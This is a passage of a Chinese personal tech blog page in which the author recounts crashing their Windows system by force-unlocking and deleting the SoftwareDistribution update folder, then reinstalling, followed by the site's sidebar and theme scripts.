+<p>这样一来，更新就不能安装了啊（恼）。可是虽然禁用了，但又没完全禁用，更新下载进程还在后台蹦跶着呢。这一看我就火了啊，打开更新目录：C:\Windows\SoftwareDistribution.删除。嗯？被占用？占用进程还是svchost.exe？好，火绒解除占用。什么？你说有危险，备份数据？我管呢，就是干（）</p>
+<p>于是，就有了这篇文章。。。（泣）我两年都没换过的系统啊（大哭）就这么没了啊（哀嚎）</p>
+<p>尝试过修复，但是完全没头绪啊（）不久结束了个进程吗？怎么就无限蓝屏重启了？</p>
+<blockquote>
+<p>错误代码：CRITICAL SERVICE FAILED</p>
+</blockquote>
+<p>翻译成人话，就是关键进程启动失败。肯定就是svchost.exe啊。毕竟dll都离不开它，它发脾气，谁受得了啊（叹）</p>
+<p>万般无奈之下，只得重装系统，和我Chrome里几百个标签页，以及好不容易磨合好的输入法、开发环境、vscode插件之类的含泪告别(〒▽〒)</p>
+<p>不够也不错。刚好趁这个机会，把硬盘里那堆文件给收拾整齐了。</p>
+<blockquote>
+<p>顺便，我貌似还有个文件管理区的坑没填来着（学完C#就去做</p>
+</blockquote>
+<h3><span id="分析">分析</span></h3><blockquote>
+<p>先占着位置，后面再分析（咕</p>
+</blockquote>
+<p>先写一点吧（）</p>
+<p>这件事非常玄学。大概搜了一下，感觉原因很可能是进程强制结束导致的文件损坏。当时的关键操作基本就是用火绒解除占用这一点，后面得看下这个强制结束的机制。</p>
+</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/page/5/">上一页</a></div><div class="pagination-next"><a href="/page/7/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/5/">5</a></li><li><a class="pagination-link is-current" href="/page/6/">6</a></li><li><a class="pagination-link" href="/page/7/">7</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/11/">11</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.jpg" alt="xeonds"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">xeonds</p><p class="is-size-6 is-block">*节操消失了*</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Shaanxi,China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">101</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">69</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/xeonds" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/xeonds"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://www.jiujiuer.xyz" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Main</span></span><span class="level-right"><span class="level-item tag">www.jiujiuer.xyz</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/web/"><span class="level-start"><span class="level-item">web</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-10-11T15:45:48.911Z">2022-10-11</time></p><p class="title"><a href="/2022/10/11/hello-world/">Hello World</a></p><p class="categories"><a href="/categories/web/">web</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-06-28T17:05:34.000Z">2022-06-29</time></p><p class="title"><a href="/2022/06/29/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BAMinecraft%E6%9C%8D%E5%8A%A1%E5%99%A8/">frp内网穿透搭建Minecraft服务器</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-06-05T12:31:58.000Z">2022-06-05</time></p><p class="title"><a href="/2022/06/05/PowerShell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PowerShell学习笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-06T10:46:36.000Z">2022-05-06</time></p><p class="title"><a href="/2022/05/06/Go%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Go学习笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-05-01T16:54:29.000Z">2022-05-02</time></p><p class="title"><a href="/2022/05/02/WSA%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/">WSA文件管理</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">十月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/06/"><span class="level-start"><span class="level-item">六月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">五月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">四月 2022</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">三月 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">一月 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">十二月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">十一月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">十月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">九月 2021</span></span><span class="level-end"><span class="level-item tag">18</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">八月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">七月 2021</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">六月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/08/"><span class="level-start"><span class="level-item">八月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/C/"><span class="tag">C++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Crypto/"><span class="tag">Crypto</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C%E8%AF%AD%E8%A8%80/"><span class="tag">C语言</span><span class="tag">12</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C%E8%AF%AD%E8%A8%80%EF%BC%8C%E6%8C%87%E9%92%88/"><span class="tag">C语言，指针</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/C%E8%AF%AD%E8%A8%80%EF%BC%8C%E7%BC%96%E8%AF%91%E5%99%A8/"><span class="tag">C语言，编译器</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Git-Linux/"><span class="tag">Git,Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/HTML%EF%BC%8CCSS%EF%BC%8Ctable/"><span class="tag">HTML，CSS，table</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hello-world/"><span class="tag">Hello-world!</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Java/"><span class="tag">Java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JavaScript%EF%BC%8C%E5%89%8D%E7%AB%AF/"><span class="tag">JavaScript，前端</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-shell/"><span class="tag">Linux,shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-%E5%B7%A5%E5%85%B7-Android/"><span class="tag">Linux,工具 Android</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Markdown-%E8%B5%84%E6%96%99/"><span class="tag">Markdown,资料</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Minecraft-%E8%AE%A1%E7%AE%97%E6%9C%BA/"><span class="tag">Minecraft,计算机</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Minecraft%EF%BC%8CLinux/"><span class="tag">Minecraft，Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python%EF%BC%8CCrypto/"><span class="tag">Python，Crypto</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WSA-Linux-ADB/"><span class="tag">WSA,Linux,ADB</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hello-world/"><span class="tag">hello-world</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nodejs%EF%BC%8CLinux/"><span class="tag">nodejs，Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B8%9C%E6%96%B9project-STG-%E7%AC%A6%E5%8D%A1-%E6%B8%B8%E6%88%8F/"><span class="tag">东方project,STG,符卡,游戏</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B8%9C%E6%96%B9project-%E9%AD%94%E6%94%B9-STG-%E8%AE%A1%E7%AE%97%E6%9C%BA/"><span class="tag">东方project,魔改,STG,计算机</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%B8%9C%E6%96%B9project%EF%BC%8CSTG%EF%BC%8C%E9%AD%94%E6%94%B9/"><span class="tag">东方project，STG，魔改</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%98%E5%82%A8%E6%B8%85%E7%90%86/"><span class="tag">存储清理</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7/"><span class="tag">工具</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7%EF%BC%8CLinux/"><span class="tag">工具，Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%9C%E6%96%B9project/"><span class="tag">工具，东方project</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%AD%A6%E4%B9%A0/"><span class="tag">工具，学习</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"><span class="tag">工具，文本编辑器</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7%EF%BC%8C%E9%9F%B3%E4%B9%90/"><span class="tag">工具，音乐</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%8CAndroid%EF%BC%8C%E5%88%B7%E6%9C%BA/"><span class="tag">操作系统，Android，刷机</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E5%AD%A6/"><span class="tag">数学</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E5%AD%A6%EF%BC%8C%E7%AE%97%E6%B3%95/"><span class="tag">数学，算法</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"><span class="tag">数据安全</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E5%AD%A6/"><span class="tag">文学</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E5%AD%A6%EF%BC%8C%E7%A7%91%E5%B9%BB/"><span class="tag">文学，科幻</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"><span class="tag">文本编辑器</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%8C%E8%AE%A1%E7%AE%97%E6%9C%BA/"><span class="tag">汇编语言，计算机</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%B8%E6%88%8F/"><span class="tag">游戏</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%B8%E6%88%8F-Minecraft/"><span class="tag">游戏,Minecraft</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%B8%E6%88%8F%EF%BC%8CSTG%EF%BC%8C%E4%B8%9C%E6%96%B9project/"><span class="tag">游戏，STG，东方project</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%B8%E6%88%8F%EF%BC%8C%E4%B8%9C%E6%96%B9project/"><span class="tag">游戏，东方project</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%AE%97%E6%B3%95/"><span class="tag">算法</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BC%96%E7%A8%8B/"><span class="tag">编程</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BC%96%E7%A8%8B-Golang/"><span class="tag">编程,Golang</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"><span class="tag">计算机</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA-Linux/"><span class="tag">计算机,Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA-Linux-Apache/"><span class="tag">计算机,Linux,Apache</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA-Linux-ssh/"><span class="tag">计算机,Linux,ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA-Minecraft/"><span class="tag">计算机,Minecraft</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA-%E5%8D%95%E7%89%87%E6%9C%BA/"><span class="tag">计算机,单片机</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA-%E7%BE%8E%E5%8C%96%EF%BC%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"><span class="tag">计算机,美化，文本编辑器</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA-%E8%B5%84%E6%96%99%EF%BC%8C%E7%BC%96%E7%A8%8B/"><span class="tag">计算机,资料，编程</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8CLinux%EF%BC%8CWebIDE/"><span class="tag">计算机，Linux，WebIDE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8CLinux%EF%BC%8C%E7%BD%91%E7%BB%9C/"><span class="tag">计算机，Linux，网络</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8CPwn/"><span class="tag">计算机，Pwn</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8CVPN%EF%BC%8CLinux/"><span class="tag">计算机，VPN，Linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8CWindows/"><span class="tag">计算机，Windows</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8C%E6%B1%87%E7%BC%96/"><span class="tag">计算机，汇编</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8C%E7%BC%96%E7%A8%8B/"><span class="tag">计算机，编程</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%EF%BC%8C%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"><span class="tag">计算机，计算机视觉</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%B5%84%E6%96%99/"><span class="tag">资料</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E8%B5%84%E6%96%99%EF%BC%8C%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86/"><span class="tag">资料，网站收集</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9A%8F%E7%AC%94/"><span class="tag">随笔</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9A%8F%E7%AC%94%EF%BC%8C%E6%96%87%E5%AD%A6/"><span class="tag">随笔，文学</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9A%8F%E7%AC%94%EF%BC%8C%E7%BC%96%E7%A8%8B/"><span class="tag">随笔，编程</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9F%B3%E4%B9%90/"><span class="tag">音乐</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9F%B3%E4%B9%90-%E4%B8%9C%E6%96%B9project/"><span class="tag">音乐,东方project</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9F%B3%E4%B9%90%EF%BC%8C%E4%B8%9C%E6%96%B9project/"><span class="tag">音乐，东方project</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">神社的储物间</a><p class="is-size-7"><span>&copy; 2022 xeonds</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
+            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
+                renderMathInElement(element);
+            });
+        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
